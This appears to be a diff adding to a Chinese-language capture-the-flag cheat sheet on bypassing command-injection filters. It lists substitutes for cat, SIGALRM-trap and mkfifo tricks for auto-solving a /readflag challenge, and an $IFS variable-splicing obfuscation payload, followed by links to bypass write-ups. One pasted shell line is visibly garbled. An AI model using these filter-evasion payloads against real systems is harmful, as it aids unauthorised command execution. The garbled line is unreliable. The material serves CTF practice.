@@ -194,5 +194,53 @@ for i in payload:
 ## 绕过cat
 
 1. ``\``
-2. ``rev,more``
+2. ``rev,more,head,more``
 3. ``tac``
+
+## 绕过``/readflag``
+
+
+>可以使用 bash 时
+>
+>**Trap the SIGALRM signal**
+>$ trap "" 14 && /readflag 
+>Solve the easy challenge first (((((-623343)+(913340))+(-511878))+(791102))-(956792)) 
+>input your answer: -387571 
+>ok! here is your flag!! 
+>...
+>
+>**mkfifo trick**
+>$ mkfifo pipe
+>$ cat pipe | /readflag |(read l;read l;echo "$(($l))\n" > pipe;cat) <dflag ((read 1;read l;echo .4(($1))\n. > pipe;cat) 
+>input your answer: 
+>ok! here is your flag!! 
+>...
+>
+>```
+>rm /tmp/pipe; mkfifo /tmp/pipe ; cat /tmp/pipe | /readflag |(read l;read l;echo "$(($l))" > /tmp/pipe;cat)
+>```
+
+https://github.com/ZeddYu/ReadFlag/blob/master/bash.md
+
+trap命令 https://man.linuxde.net/trap
+
+mkfifo /tmp/f is creating a named pipe at /tmp/f.
+
+cat /tmp/f is printing whatever is written to that named pipe and the output of cat /tmp/f is been piped to /readflag
+
+## 一些绕过技巧
+
+```bash
+a=dex.php;b=in;d=bas;e=e64;c=$d$e$IFS$b$a;$c;
+```
+bash变量字符拼接
+
+### 参考资料
+
+命令注入绕过姿势
+
+https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/
+
+rce bypass
+
+http://www.leommxj.com/2017/06/11/RCE-Bypass/
